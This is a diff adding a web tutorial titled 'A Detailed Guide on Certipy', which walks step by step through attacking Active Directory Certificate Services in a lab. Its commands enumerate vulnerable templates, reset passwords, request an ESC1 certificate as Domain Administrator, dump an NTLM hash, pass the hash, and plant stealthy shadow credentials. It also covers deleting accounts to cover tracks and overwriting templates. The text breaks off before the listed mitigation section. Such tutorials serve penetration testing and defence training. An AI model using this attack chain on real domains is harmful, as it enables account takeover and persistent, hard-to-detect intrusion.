@@ -1,0 +1,270 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/active-directory-certificate-attack/" rel="category tag">Active Directory Certificate Attack</a>, <a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
+            <h1 class="post-title entry-title">A Detailed Guide on Certipy</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/a-detailed-guide-on-certipy/" rel="bookmark"><time class="entry-date published" datetime="2025-06-10T12:15:37+00:00">June 10, 2025</time><time class="updated" datetime="2025-06-19T13:22:54+00:00">June 19, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000">In this <strong data-start="8" data-end="49">Certipy Active Directory Exploitation</strong> guide, we explore how to use Certipy—an offensive and defensive toolkit designed for Active Directory Certificate Services (AD CS)—to enumerate misconfigurations and abuse CA templates. Whether you’re targeting ESC1 to ESC16 attack vectors or forging certificates for privilege escalation and persistence, this article will take you step-by-step through the necessary stages—from identifying vulnerable templates to gaining domain authentication.</span></p>
+<h3><span style="color: #800000">Table of Content</span></h3>
+<ul>
+<li><span style="color: #000000">Overview of Certipy</span></li>
+<li><span style="color: #000000">ADCS Key Concepts</span></li>
+<li><span style="color: #000000">Prerequisites</span></li>
+<li><span style="color: #000000">Finding Vulnerable Templates</span></li>
+<li><span style="color: #000000">Examining Account Privileges</span></li>
+<li><span style="color: #000000">Manipulating Accounts</span></li>
+<li><span style="color: #000000">Requesting Certificates</span></li>
+<li><span style="color: #000000">Authenticating via Certificate</span></li>
+<li><span style="color: #000000">Managing Shadow Credentials</span></li>
+<li><span style="color: #000000">Modifying Templates &amp; CA</span></li>
+<li><span style="color: #000000">Forging &amp; Relaying Certificates</span></li>
+<li><span style="color: #000000">Mitigation</span></li>
+</ul>
+<h3><span style="color: #800000">Overview of Certipy</span></h3>
+<p><span style="color: #000000"><strong>Certipy</strong> is a specialized tool designed to identify and exploit weaknesses in <strong>Active Directory Certificate Services (ADCS)</strong>. While ADCS plays a critical role in enabling certificate-based authentication and encryption in Windows environments, misconfigurations and overly permissive templates can turn it into a high-impact attack vector.</span></p>
+<p><span style="color: #000000">Attackers and red teamers can use Certipy to discover these misconfigurations, escalate privileges, impersonate users, and gain <strong>persistent domain access</strong> without ever needing a password. This is achieved through various known abuse paths, often categorized as <strong>ESC1–ESC16</strong>, which align to specific vulnerabilities in template design, permissions, and CA trust models</span></p>
+<h5><span style="color: #000000">Key Certipy Commands and Techniques utilize Certipy to identify these misconfigurations, escalate privileges, impersonate users, and gain persistent domain access without requiring.</span></h5>
+<p><span style="color: #000000">Certipy supports multiple commands, each mapped to specific ADCS attack paths:</span></p>
+<ul>
+<li><span style="color: #000000"><strong>find</strong> – Enumerates AD CS configuration to identify Certificate Authorities, templates, and potential ESC vulnerabilities for auditing or attack preparation.</span></li>
+<li><span style="color: #000000"><strong>account</strong> – Manages user or computer account attributes for certificates, enabling actions like setting SPNs, UPNs, or creating machine accounts for advanced certificate-based attacks.</span></li>
+<li><span style="color: #000000"><strong>req</strong> – Request a certificate from a CA, specify template and CA name, use alternate credentials, supports RPC, DCOM, or HTTP(S), attackers use certipy req to exploit templates for impersonation</span></li>
+<li><span style="color: #000000"><strong>auth</strong> – Authenticate using a certificate (PFX) for domain access via Kerberos PKINIT or Schannel to LDAP, retrieving a TGT and NTLM hash.</span></li>
+<li><span style="color: #000000"><strong>shadow</strong> – Perform Shadow Credentials attack to create a certificate-linked credential on a user, allowing authentication via certificate.</span></li>
+<li><span style="color: #000000"><strong>Template</strong> – Manage Certificate Template objects in AD by dumping, modifying, and restoring template configurations, useful for scenarios like ESC4.</span></li>
+<li><span style="color: #000000"><strong>ca </strong>– Manage CA settings to enable/disable templates, approve/deny requests, and add/remove CA managers.</span></li>
+<li><span style="color: #000000"><strong>forge</strong> – Forge certificates with a compromised CA’s private key to create arbitrary certificates, useful for persistence if a root or subordinate CA is compromised.</span></li>
+<li><span style="color: #000000"><strong>relay</strong> – Perform an NTLM relay attack targeting AD CS HTTP(S) or RPC endpoints to get a certificate issued for the victim, automating ESC8 and ESC11 attacks.</span></li>
+</ul>
+<h4><span style="color: #000000">Why These Techniques Work</span></h4>
+<p><span style="color: #000000">These techniques don’t rely on code exploits but on misuse of trust and weak policies:</span></p>
+<ul>
+<li><span style="color: #000000"><strong>CA trusts authentication, not true identity</strong> – If the request looks valid, a certificate may be issued to an attacker.</span></li>
+<li><span style="color: #000000"><strong>Template misconfigurations</strong> – Allow client authentication and SAN control, enabling impersonation.</span></li>
+<li><span style="color: #000000"><strong>Shadow credentials</strong> – Inject alternate credentials invisibly, bypassing passwords and MFA.</span></li>
+<li><span style="color: #000000"><strong>Cert-based auth bypasses passwords</strong> – Grants domain logon without needing the target’s password.</span></li>
+<li><span style="color: #000000"><strong>Powerful CA roles</strong> – Certificate Officers and CA Admins can issue certs for anyone, risking domain takeover.</span></li>
+</ul>
+<h3><span style="color: #800000">ADCS Key Concepts</span></h3>
+<p><span style="color: #000000">ADCS is a cornerstone of identity verification and secure communication (e.g., smart cards, TLS, VPN access, email encryption), it also represents a <strong>high-value target for attackers</strong>. This is because ADCS is deeply integrated with Active Directory and is <strong>implicitly trusted</strong> throughout the domain.</span></p>
+<p><span style="color: #000000">Why ADCS is an Attack Surface</span></p>
+<p><span style="color: #000000">Misconfigurations in <strong>certificate templates</strong> or <strong>CA settings</strong> can enable various attack vectors:</span></p>
+<ul>
+<li><span style="color: #000000"><strong>Certificate Templates</strong>: Misconfigured templates can allow low-privileged users to request certificates for <strong>privileged accounts</strong> (<a style="color: #000000" href="https://www.hackingarticles.in/ad-certificate-exploitation-esc1/">ESC1</a>).</span></li>
+<li><span style="color: #000000"><strong>Web Enrollment</strong>: Exposing the AD CS interface (/certsrv) over HTTP with NTLM enabled can be exploited for <strong>NTLM relay attacks</strong> (<a style="color: #000000" href="https://www.hackingarticles.in/adcs-esc8-ntlm-relay-to-ad-cs-http-endpoints/">ESC8</a>).</span></li>
+<li><span style="color: #000000"><strong>Shadow Credentials</strong>: Improper handling of <strong>keyCredentialLink</strong> allows <strong>persistence techniques</strong> that survive password changes (ESC9/10).</span></li>
+<li><span style="color: #000000"><strong>Escalation Certificates (ESC)</strong>: Attackers can exploit patterns of misuse such as misconfigured SANs (ESC1), NTLM relay (ESC8), and shadow credentials (ESC9/10) for domain compromise.</span></li>
+</ul>
+<h3><span style="color: #800000">Prerequisite </span></h3>
+<ul>
+<li><span style="color: #000000">Windows Server 2019 as Active Directory that supports PKINIT.</span></li>
+<li><span style="color: #000000">Domain must have Active Directory Certificate Services and Certificate Authority configured with the Web Enrollment role enabled.</span></li>
+<li><span style="color: #000000">Kali Linux packed with tools</span></li>
+<li><span style="color: #000000">Tools: certipy-ad, PetitPotam</span></li>
+</ul>
+<p><span style="color: #000000">We don’t need zero-days when ADCS is misconfigured. A flawed certificate template can lead to full domain compromise, much like a Remote Code Execution exploit, but using native tools and legitimate protocols.</span></p>
+<p><span style="color: #000000">Tools like <strong>Certipy</strong> uncover these hidden privilege escalations and trust-based vulnerabilities within ADCS.</span></p>
+<p><span style="color: #000000">Now that we have a solid understanding of <strong>Active Directory Certificate Services (ADCS)</strong> and the abuse pathways of <strong>ESC</strong> techniques, it’s clear how misconfigured trust settings make ADCS a prime target for attackers.</span></p>
+<p><span style="color: #000000">With these vulnerabilities in mind, let’s proceed and exploit them in practice using <strong>certipy-ad</strong>.</span></p>
+<h3><span style="color: #800000">Finding Vulnerable Templates</span></h3>
+<p><span style="color: #000000">Let’s begin by identifying the weak spots. Vulnerable templates often allow any authenticated user to automatically enroll for client-auth certificates.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad find -u raj -p Password@1 -dc-ip 192.168.1.20 -target-ip 192.168.1.20 -vulnerable -enable -stdout</pre>
+<p><span style="color: #000000">This command scans the CA for certificate templates with misconfigurations that enable privilege escalation, such as <strong>ESC1</strong>-type abuses.</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhyLtKOMrvtBLe8LJl2Iidpcl2z1Y7csieQMiV-ytfBLT7437BUdbILBTHbyiDGXqKyH1tjhf7N0-052JJaA0qe9kvrw354uW5NuiSJ9KtSxRNdfDr9Q0mGqbFjXupsETILmbzn6VsfvmNuty9n7djeB6UczxJGpVqsiniVwQOUuQ6O_5ezATYezAHWxRZA/s16000/1.png"/></p>
+<p><span style="color: #000000">Vulnerable templates typically exhibit characteristics such as <strong>Client Authentication EKU</strong>, <strong>“Supply in Request” SAN</strong>, <strong>Auto-issue</strong> without approval, and accessibility by low-privileged users, (e.g., <strong>“sanjeet</strong> in our case). Now, let’s see what we’ve enumerated.</span></p>
+<p><span style="color: #000000">This enumerates CA and templates identifying configurations supporting ESC attacks (e.g., ESC6, ESC8).</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjIT8sWsNDWctcG5966X7uXOfriA3N9Xb4iaePvHClw7FsXwOKRkoDu-u-gwdK2ZQUvbKjHQx8zqoxMF4Ko1n2pnLErtowz_NO3zbJSMGAsEHNbJnGkZNISe3WK2pUtzcOpFyjEXhFRs27ww9My4Cf22nGb7xOcxWr1mVuweFhXk700uwcCwBeojZe6yR-N/s16000/2.png"/></p>
+<p><span style="color: #000000"><em><strong>Note</strong>: <strong>This step sets the stage</strong> for our entire attack chain. Without a vulnerable template, most subsequent exploits wouldn’t be possible</em>.</span></p>
+<h3><span style="color: #800000">Examining Account Privileges</span></h3>
+<p><span style="color: #000000">Now, let’s assess what we can control. If our user (e.g., <strong>raj</strong>) has the ability to read or modify sensitive attributes on another user account (e.g., <strong>sanjeet</strong>), we could potentially:</span></p>
+<ul>
+<li><span style="color: #000000">Inject a shadow credential for later use</span></li>
+<li><span style="color: #000000">Reset their password to escalate privileges</span></li>
+<li><span style="color: #000000">Add ourselves to privileged groups for further control</span></li>
+</ul>
+<p><span style="color: #000000">To perform this, execute the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad account -u raj -p Password@1 -dc-ip 192.168.1.20 -target 192.168.1.20 -user sanjeet read</pre>
+<p><span style="color: #000000">The read switch in Certipy allows <strong>raj</strong> to retrieve and view attributes of <strong>sanjeet’s</strong> account, such as cn, sAMAccount and other sensitive information, which could be leveraged for privilege escalation or further exploitation.</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjbSPXAE5b-CoBmIOzsS8nujCoB6OB9BzdVS4290ddslbPSUolrC5DujZZgS0kuobLShgZZgukONTJlPC6zVDkuXdxxG6OaFqSWDiBHHft2OP-CgsKtcrrhGfxLVKM2x8s5YEBfex286s339uHC2sDYtwhFs-UzZ0VaTY_0ZeQNSPx4thvsFPIGFBBGBbhq/s16000/3.png"/></p>
+<h3><span style="color: #000000"><span style="color: #800000">Manipulating Accounts</span> </span></h3>
+<p><span style="color: #000000">Having confirmed our permissions, we act. We can now use these commands to show how we or administrators can manipulate accounts:</span></p>
+<h4><span style="color: #000000">Update passwords </span></h4>
+<p><span style="color: #000000">This command allows the <strong>Administrator</strong> to authenticate and reset <strong>sanjeet’s</strong> password to <strong>Password@12</strong> on the specified Domain Controller (192.168.1.20), enabling privilege escalation or control over the <strong>sanjeet</strong> account for further exploitation.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad account -u Administrator -p Password@1 -dc-ip 192. 168.1.20 -target 192.168.1.20 -user sanjeet -pass Password@12 update</pre>
+<p><span style="color: #000000">Once elevated (e.g., via ESC1), we can reset passwords for any domain user, including admins, enabling instant account hijacking, control over multiple accounts, and strategic lateral movement.</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhdhGmsQSSyVicF0oGSUYfgAAr8TTcQ9S8KGPohn9vi126RQTpcv9uNCinDaoCEq9_FardNfbAMsLV78wROhIJKMtSDSgxwarpZKitB1xlq0N8ZTmNAFba8lDzEyvVgiCUw6YETYDSeirz-dzjj6Jl8djz7AoKK4US-OuxZsC-wzieeO041wviBEsaxN6Cr/s16000/4.png"/></p>
+<h4><span style="color: #000000">Create accounts (e.g., computer accounts to abuse ESC8) </span></h4>
+<p><span style="color: #000000">This command lets <strong>raj</strong> create a new machine account, <strong>BADPC</strong>, with the password <strong>Password@2</strong> on the Domain Controller at <strong>192.168.1.20</strong>. Machine accounts can be exploited for <strong>NTLM relay attacks</strong> (ESC8) or for persistence, aiding in privilege escalation and maintaining access.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad account -u raj -p Password@1 -dc-ip 192.168.1.20 -target 192.168.1.20 -user BADPC -pass Password@2 create</pre>
+<p><span style="color: #000000">Machine accounts, often authorized to enroll in domain computer templates, can be exploited by us to abuse <strong>ESC8</strong> for NTLM relay, request certificates via machine-based templates, or pivot to <strong>DCSync</strong> using domain controller template access.</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhmxj-I9k4Lo9o2DK3XJbveQlOb8x03MessXMGKpzDzRN4XcR-oxc-hlMsY8y20szyGCLrrJv4LGxmL2bimZJPwK1R83DmKVbPKTjJSbGhvxNAu3Vi-Q2N7H2uhQX_B8Oodx-R-C6Haqwd_9hcEWH_WFkLwvIxYMqLBWNp-Aux8D0cFkKhPsjjS-efgk3u9/s16000/5.png"/></p>
+<h4><span style="color: #000000">Delete accounts</span></h4>
+<p><span style="color: #000000">This command Deletes the BADPC machine account after use.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad account -u Administrator -p Password@1 -dc-ip 192.168.1.20 -target 192.168.1.20 -user BADPC delete</pre>
+<p><span style="color: #000000">Useful for covering tracks after using the account to relay NTLM authentication (<strong>ESC8</strong>), shadow a machine, or obtain a certificate via auto-enrollment.</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhN_p40fsxiySuClObv3nJPLo66HCqyIvo5zHZh-gps9tsBDpE-WYM5Yk3x2FXfs6LSGXALURPolUKpJxQffVvbIhYG6bwhAwSKCuKElDnZN0N3U14v7nIWjAhSRwvOCv6yYae1AeuPVbFschsME63-_4feBuboUTxoTjfWqi4gbFA48TQyUd69k72LX-Qz/s16000/6.png"/></p>
+<h3><span style="color: #000000"><span style="color: #800000">Requesting Certificates</span> </span></h3>
+<p><span style="color: #000000">Then, we exploit the vulnerable certificate template previously discovered during our enumeration phase. Here, we request a certificate <strong>as the Domain Administrator</strong>, embedding their UPN and SID. The CA, due to poor template controls, <strong>signs the cert without verification</strong>.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad req -u raj -p Password@1 -dc-ip 192.168.1.20 -target 192.168.1.20 -ca ignite-DC01-CA -template ESC1 -upn 'administrator@ignite. local' -sid 'S-1-5-21-2876727035-1185539019-1507907093-500</pre>
+<p><span style="color: #000000">If Successful, we now have a legitimate certificate impersonating a privileged identity.</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhZjUCtEzwoLBrMx793wD3sY-yOcrENDXYERS4-w66VBjBi8fMuMIjkAsCjWl0llhJzIgCN7lSyRvVISj5XAAM2GV04epc-aWlOG3CdNaa9lZXlChn6xuY7AkNGi9nyjSrYjNOpH8U0l7GywRhLb48S0pIwjad43xDaglQzGuuHoUNxEuwZBuNURAd8ErDv/s16000/7.png"/></p>
+<h3><span style="color: #800000">Authenticating via Certificate</span></h3>
+<p><span style="color: #000000">With the issued .pfx certificate impersonating the Domain Administrator, we use Kerberos PKINIT for certificate-based authentication, bypassing the admin’s password. Signed by a trusted CA and containing the admin’s identity, the domain controller accepts it as legitimate, granting full administrative access and marking a key point for privilege escalation.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.1.20</pre>
+<p><span style="color: #000000">This dumps the NTLM hash, you can use it for further exploitation.</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgGJIgdsME6B1Y3ov46h8OLmhfjKY8QlHAwiPI1P486LEu7K7twdDFV1dUlyqNif03SIAZvMbtNsAMNmIorgQ6zXINb9Om8DZ6xdnFkIaRe84djubBx4VqdbkMXmnRx-4uvo2iukLfxeQBVkSxx7U-bK_wHr5gAlqNi0jx-Jhkxbnf_o-QA3R0-uibrBtv3/s16000/8.png"/></p>
+<p><span style="color: #000000">In our Case we use this command to shows that we can use a known NTLM hash (e.g., <strong>raj</strong>) to authenticate to AD and check permissions on the <strong>Administrator</strong> account, potentially revealing if they can modify account properties, inject shadow credentials (<strong>ESC10</strong>), or reset passwords, making it a key technique when password hashes are more accessible than cleartext credentials.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad account -u raj -hashes 64fbae31cc352fc26af97cbdef151e03 -dc-ip 192.168.1.20 -user ‘administrator’ read</pre>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEixowxmxvQ3J0hGrfWQAvKBp_xR8f9xRjMxXZyq9MI6h2ulb6redGyWxkFCTAsyqG3O5XlC-TaIkOdcj8MiiRs7Hev2xGl5J-jJbFs3Cwrg1AUbnDXGwO9ZnqCyiq8lFlxeKuUcFv4Jxmhqx6578yWDhArNokwwYBbDXkMMa1sLMiTJvLrhnzqyNYCxkwO4/s16000/9.png"/></p>
+<h3><span style="color: #800000">Managing Shadow Credentials</span></h3>
+<p><span style="color: #000000">After achieving elevated access through certificate abuse (e.g., ESC1), we now shift focus from escalation to <strong>persistence</strong>. Shadow credentials allow us to inject alternate login credentials into another user’s account without altering their password or triggering typical detection mechanisms.</span></p>
+<p><span style="color: #000000">These credentials reside in the <strong>msDS-KeyCredentialLink</strong> attribute and are used during <strong>Kerberos PKINIT</strong> login. They are durable, stealthy, and extremely effective for maintaining long-term access.</span></p>
+<p><span style="color: #000000">Then, we consolidate our foothold by adding shadow credentials to user <strong>shivam in our case</strong> through manipulation of their <strong>msDS-KeyCredentialLink</strong> attribute. This allows us to log in as <strong>shivam</strong> without accessing their credentials, and the shadow credentials persist through password resets, providing a stealthy, long-term persistence method.</span></p>
+<p><span style="color: #000000"><em><strong>Note</strong>: This technique (ESC9/10) is highly stealthy, bypasses most traditional detections, and remains persistent even after password resets unless specifically removed.</em></span></p>
+<h4><span style="color: #000000">Add a Shadow Credential</span></h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad shadow -u raj -p Password@1 -dc-ip 192.168.1.20 -account shivam add</pre>
+<p><span style="color: #000000">This Injects a new certificate-based credential into the msDS-KeyCredentialLink of user shivam. Once added, this key enables <strong>passwordless authentication</strong> as shivam, using certificate-based login methods.</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEidiPlehujdw8XCjNJJsHQdJMVMJxD7nxR22tsSTL_mm59n-Mehe-pfVKW6eVDtqtlg1WnC4TUA9n2s5cHDg_w3H0wEDyPGBLCaxw4YJxnT6bCk0iT8hB9V2O1ndr4wpiX-XGqHaSn7Dsqf1k1d-oLuMLdNTi0_d2Od5wNDoItaD5wsF0w9Z6S8QYOd2kq8/s16000/10.png"/></p>
+<p><span style="color: #000000"><em><strong>Note</strong>: This is central to <strong>ESC10</strong> abuse, where injecting a certificate key into another user’s account eliminates the need for password theft or resets, with shadow credentials persisting across password changes and evading standard monitoring tools unless specifically checked.</em></span></p>
+<h4><span style="color: #000000">List Existing Shadow Credentials</span></h4>
+<p><span style="color: #000000">This command Lists all device IDs associated with shadow credentials currently tied to shivam.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad shadow -u raj -p Password@1 -dc-ip 192.168.1.20 -account shivam list</pre>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-2BuBRZ5jUaII3kSLCI3HBryK7-e355QOBMqrNLX9FSOk8wT9CJxxYOr9Unxo4QouDlaMdSPWM7IOHitwyKP__UYIknybw6Ouxuo5f8sYMOF_55i5ErTi-XFy9KzU1F_NDWy3GyNw0ttdQHKTtboqLJ9tcFTKUY9_MLjvuRZRXd_p_dXF_sExerKz3iVu/s16000/11.png"/></p>
+<p><span style="color: #000000"><em><strong>Note</strong>: This is valuable for both attackers, who may check for previous access or avoid duplicates, and defenders, who can enumerate persistence methods added after a compromise, aligning with real-world forensic needs in red and blue team operations.</em></span></p>
+<h4><span style="color: #000000">Inspect Specific Shadow Credential</span></h4>
+<p><span style="color: #000000">This command displays detailed metadata about a specific shadow credential associated with shivam, including the device ID, issuer, and when it was added.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad shadow -u raj -p Password@1 -dc-ip 192.168.1.20 -account shivam -device-id 528c42e7-1395-e86c-4b06-fffd9758fe6b info</pre>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhfy1Ooalsi7gHs3f6bqZUHpxnPj7JbanxGMeSQzkGeDCA7gWvTiY2zNGNGCbZ7ZouW1ISFFI0uXYEAH_a4ZRhq79DeUnhBtBaD7CWMaU2B62cVwUOn6-809Wlfg396uoHi_683YFD_n6Rji28L4OEwGmCPaKCC5BDnEj0v9i1kLUjp0Leh1IyTxcLEhYOG/s16000/12.png"/></p>
+<p><span style="color: #000000"><em><strong>Note</strong>: This reveals if the credential was recently injected, the method used, and the attacker, which is crucial for understanding access patterns and building a forensic timeline during incident response.</em></span></p>
+<h4><span style="color: #000000">Remove a Shadow Credential</span></h4>
+<p><span style="color: #000000">This command Removes the specified shadow credential from shivams’s account. And also verifies if any specific shadow credential associated with shivam</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad shadow -u raj -p Password@1 -dc-ip 192.168.1.20 -account shivam -device-id 528c42e7-1395-e86c-4b06-fffd9758fe6b clear
+certipy-ad shadow -u raj -p Password@1 -dc-ip 192.168.1.20 -account shivam -device-id 528c42e7-1395-e86c-4b06-fffd9758fe6b info</pre>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjiHFCJqYJLSdVy2sftXdYaNmqoa7Xiw59cxSU6dkHOJKDfW6wzhsE5i1hEluqwBZRPRRmdm-zdhmQEOtOarqmEEuazUjaETxEE9TkZSLr2XsOn-t1j4NHcigo2XpeEPSRWutvwWNwwe4kX2PZwTkBoTZ_DW2lGyM271UFeipDtNzglVdDAJC1g5bHq55FY/s16000/13.png"/></p>
+<p><span style="color: #000000"><em><strong>Note</strong>: Shadow credentials are used for post-exploitation clean-up, bypassing password resets or MFA revocation, making removal the only way to revoke access and emphasizing the need for defenders to detect them.</em></span></p>
+<p><span style="color: #000000">Now verifying if any device IDs associated with shadow credentials currently tied to shivam. If any will get removed with the command shown below.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad shadow -u raj -p Password@1 -dc-ip 192.168.1.20 -account shivam list
+certipy-ad shadow -u raj -p Password@1 -dc-ip 192.168.1.20 -account shivam -device-id d867fd89-9bf7-6831-fc13-adf40d60b014 remove</pre>
+<p><span style="color: #000000">This confirms the removal of specified shadow credential from shivams’s account.</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgF9q0E5u5Spz29T-4EBiev2dyFAyuBuLav-ZLDJXIsOeCo7ObtOOtENdhHRJG8iupTcNaSksHoEjiyyXlDgj7Hak7i2ZkFFwUN1XibTR7RFPAZ-dErkkGGm-J_vL06MFJ2oDc3N7c1OcSxr1OcX90suXdxRlvw-x_8gmF1jwyWIbCtgxDKL2dIWZUTB9ls/s16000/14.png"/></p>
+<h4><span style="color: #000000">Automate Add → Use → Remove (Stealth Access)</span></h4>
+<p><span style="color: #000000">This command performs a stealth access chain in one command: adds a shadow credential, authenticates with it, then deletes it immediately.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad shadow -u raj -p Password@1 -dc-ip 192.168.1.20 -account shivam auto</pre>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEidpOiAruVMtkI-isYuy3fS4TMOkBc49Dry5CYACO1zOdFHU-lGyosPLr953gmN-oFQ12EW1aWIlPSgSgic2g6c9vBgo3F0MKdkksrQNz5fopBCMpz491SbvKJtezdG2tm4gt3WflMMNIKfZScO8Rp4tRDntwQ9PcYOYhJQ7GayK5adrvioQAUCCJljd1xb/s16000/16.png"/></p>
+<p><span style="color: #000000"><em><strong>Note</strong>: Perfect for stealthy red team ops or attackers, it leaves no password logs or certificate records, making detection hard without specific shadow checks</em><em>.</em></span></p>
+<h3><span style="color: #800000">Modifying Templates &amp; CA</span></h3>
+<p><span style="color: #000000">After gaining certificate-based access. We take control of the Certificate Authority (CA), restore vulnerable templates, add ourselves as certificate officers, and manipulate templates like <a style="color: #000000" href="https://www.hackingarticles.in/adcs-esc4-vulnerable-certificate-template-access-control/">ESC4</a>. With full CA backups and control, we don’t just exploit the system. But we manage and automate a persistent attack surface.</span></p>
+<h4><span style="color: #000000">Backup a Template Configuration</span></h4>
+<p><span style="color: #000000">This command Saves the current configuration of the ESC4 template to a local JSON file.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad template -u raj -p Password@1 -dc-ip 192.168.1.20 -template ESC4 -save-configuration backup.json</pre>
+<p><span style="color: #000000">This allows us to back up the template’s state, either for safe restoration later or to set it up for malicious modification.</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhtKWRGqCXguTrz7GkCC9LG7gawnu8xbm3pRNk99v087dvQFfCUVIjvOMorwiuVxcwDf33pl8rzo3HkkcUyLcJ6uwPV3_6h4Ipv9iajYV8AjxQ5XPLhHaLO_r-jagu8NdeK1olrmKMPbtsVUFfvVc2C3MA7mbTZY7GATdvo1E8PLL-ga1OnJbhiTxOxYa0T/s16000/17.png"/></p>
+<h4><span style="color: #000000">Overwrite with Default Configuration</span></h4>
+<p><span style="color: #000000">This command replaces the ESC4 template’s settings with a <strong>default configuration</strong>.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad template -u raj -p Password@1 -dc-ip 192.168.1.20 -template ESC4 -write-default-configuration</pre>
+<p><span style="color: #000000">This is useful for weakening hardened templates, reintroducing vulnerabilities (like “enrollee-supplied SAN”), or resetting them to allow attacker-issued certificates (e.g., ESC4-style abuse).</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhuLRLqDhn-ORUaJwLQI9Bmg0Afm6jt1vj_qS9Bg3WQoLCO3MRwkYEa8A-75XoYY5NbnMaGwQGKGXmiCX2FK7l2pjQpp6Tq4imyjD4ENebjIBcgqH1iXrHY6hlshKij-3GYIKl5s78l3CPAhO34JpFXZ46pfBBUXMkXb2N03ugpQCzwhZ7-8HEMuJI-lzQh/s16000/18.png"/></p>
+<p><span style="color: #000000">Let’s quickly review the Certificate Authority (CA) template and how misconfigurations, like those seen in ESC1 and ESC4, can introduce vulnerabilities:</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiAzj4L5tlRlY3SuzK3x8GVEM7fytAEpvPA3Toq8vSYxhMYuRv_2cvPgPGtt-aQQhnBLqdSdPXNU9zqRrGGDZVikD8UhD6jWZCWo2F6HWXMBs2b_mWO7xwvFZzBqvOf7O9udIbd_gPHZiQ40g0FQEL_jjJMmVhDjuWTZ2RIijouWGG_trSKM6sZFFa7gOks/s16000/19.png"/></p>
+<h4><span style="color: #000000">Apply a Modified or Backdoored Template</span></h4>
+<p><span style="color: #000000">This command overwrites the template using the saved JSON from earlier. The -no-save flag ensures that the overwrite is silent and doesn’t re-back up the current version.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad template -u raj -p Password@1 -dc-ip 192.168.1.20 -template ESC4 -write-configuration backup.json -no-save</pre>
